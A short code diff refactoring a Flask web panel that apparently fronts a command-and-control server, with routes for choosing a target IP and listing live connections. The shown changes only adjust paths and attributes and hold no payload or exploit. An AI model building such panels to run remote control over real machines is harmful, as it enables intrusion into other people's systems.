@@ -9,12 +9,12 @@ class FlskSevrev(object):
     def __init__(self,C2Private,C2Port=555):
         self._internalSock = IntrnalSocketServer()
         self._internalSock.start()
-        path = os.path.join(os.getcwd(),'FlascAplication','test','templates','static')
-        print(path)
-        self.app = Flask(__name__, static_folder=path)
+        self.app = Flask(
+            __name__, 
+            static_folder=os.path.join(os.getcwd(),'FlascAplication','test','templates','static')
+        )
         self.c2Server = Server(port=C2Port,PrivateKey=C2Private)
         self.c2Server.start()
-        self.targetConnction = self.c2Server.connection
         self._ruleResetor()
         
 
@@ -23,11 +23,11 @@ class FlskSevrev(object):
         return render_template('index.html',hostname=hostname)
     
     def choseTarget(self,targetIp):
-        self.c2Server.connectTo = targetIp
+        self.c2Server.connections.connctTo = targetIp
 
 
     def listConnections(self):
-        return self.c2Server.connections
+        return self.c2Server.connections.connections
     
     def homePage(self):
         return render_template('mainIndex.html')
